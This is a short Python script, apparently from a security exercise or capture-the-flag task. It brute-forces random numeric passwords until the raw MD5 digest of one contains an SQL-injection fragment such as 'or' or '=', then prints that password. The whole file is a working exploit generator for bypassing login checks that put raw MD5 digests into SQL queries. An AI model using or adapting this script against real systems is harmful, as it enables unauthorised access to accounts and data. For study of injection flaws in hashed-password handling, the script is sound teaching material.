from pymd5 import md5
import sys
import random
import re



while (1):
	test = "nope'='nope"
	r1 = random.randint(1,2**31 - 1)
	r2 = random.randint(1,2**31 - 1)
	r3 = random.randint(1,2**31 - 1)
	r4 = random.randint(1,2**31 -1)
	password = str(r1)+str(r2)+str(r3)+str(r4)
	m = md5()
	m.update(password)
	x = m.digest()
	if re.search(b"\'or\'", x) or re.search(b"\'OR\'", x) or re.search(b"'='", x):
		print(password,x)
		break

